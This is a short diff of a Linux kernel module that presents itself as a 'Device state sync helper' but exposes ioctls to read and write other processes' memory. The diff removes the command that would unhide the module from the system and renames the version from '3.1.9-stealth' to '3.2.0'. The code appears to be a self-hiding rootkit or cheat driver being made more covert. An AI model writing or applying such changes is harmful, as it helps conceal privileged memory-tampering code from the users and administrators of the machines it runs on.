@@ -15,7 +15,6 @@
 #define CMD_PROC_READ	0x801
 #define CMD_PROC_WRITE	0x802
 #define CMD_MOD_BASE	0x803
-#define CMD_UNHIDE	0x806
 
 static dev_t rt_dev;
 static struct cdev rt_cdev;
@@ -79,10 +78,6 @@ static long rt_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
 		mb.base = kmem_get_modbase(mb.pid, name);
 		if (copy_to_user((void __user *)arg, &mb, sizeof(mb)))
 			return -EFAULT;
-		return 0;
-
-	case CMD_UNHIDE:
-		kmem_unhide_module(THIS_MODULE);
 		return 0;
 
 	default:
@@ -167,10 +162,6 @@ static long rt_compat_ioctl(struct file *file, unsigned int cmd, unsigned long a
 			compat_u64 base64 = base;
 			copy_to_user((char __user *)uarg + 8, &base64, sizeof(base64));
 		}
-		return 0;
-
-	case CMD_UNHIDE:
-		kmem_unhide_module(THIS_MODULE);
 		return 0;
 
 	default:
@@ -315,4 +306,4 @@ module_exit(rt_exit);
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("dmsync");
 MODULE_DESCRIPTION("Device state sync helper");
-MODULE_VERSION("3.1.9-stealth");
+MODULE_VERSION("3.2.0");
